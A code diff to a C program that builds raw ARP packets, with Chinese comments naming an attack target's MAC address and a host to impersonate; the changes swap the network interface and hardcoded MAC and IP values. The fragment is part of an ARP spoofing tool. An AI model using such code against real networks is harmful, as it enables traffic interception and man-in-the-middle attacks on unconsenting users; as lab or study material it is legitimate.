@@ -7,12 +7,10 @@
 #include <string.h>
 #include <linux/if_ether.h>
 #include <linux/if_packet.h>
-#include <zconf.h>
+//#include <zconf.h>
 #include "model.h"
 
-#define DEFAULT_DEVICE "eth0"
-
-//arp -s 10.1.102.1 70-57-bf-7e-65-68
+#define DEFAULT_DEVICE "ens33"
 
 int main(int argc, char *argv[]) {
     int sock, size, bytes_send;
@@ -34,18 +32,16 @@ int main(int argc, char *argv[]) {
 
     //bro_hw 攻击目标的mac地址
 //    uint8_t bro_hw[] = { 0xff, 0xff, 0xff, 0xff, 0xff, 0xff };//所有
-//    uint8_t bro_hw[] = {0x90, 0x9c, 0x4a, 0xbf, 0x6c, 0x71};//mac
-    uint8_t bro_hw[] = {0xA4, 0xBB, 0x6D, 0x4C, 0xE3, 0x49};//me
+    uint8_t bro_hw[] = {0x00, 0x15, 0x5d, 0x13, 0x9a, 0x04};//
 
-    //(10.1.102.1) at 70:57:bf:7e:65:68 [ether] on eno16777736
     //src_hw 假冒这个人   ip mac
-    uint8_t src_hw[] = {0xb4, 0x2e, 0x99, 0x89, 0xe3, 0x11}; //tell
-    uint8_t src_ip[] = {0x0a, 0x00, 0xa9, 0x01}; //
+    uint8_t src_hw[] = {0x18, 0x3d, 0x5e, 0x76, 0x6b, 0xab}; //tell
+    uint8_t src_ip[] = {0x0a, 0x4f, 0x13, 0x01}; //
 
     //dec_hw 发给攻击目标的   ip mac 映射
     //	uint8_t dec_hw[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 }; //who has
-    uint8_t dec_hw[] = {0xb4, 0x2e, 0x99, 0x89, 0xe3, 0x11};
-    uint8_t dec_ip[] = {0x0a, 0x00, 0xa9, 0x01};
+    uint8_t dec_hw[] = {0x18, 0x3d, 0x5e, 0x76, 0x6b, 0xab};
+    uint8_t dec_ip[] = {0x0a, 0x4f, 0x13, 0x01};
 
     //以太网首部
     printf("create ethhead, ethhdr size=%d字节\r\n", sizeof(struct ethhdr));
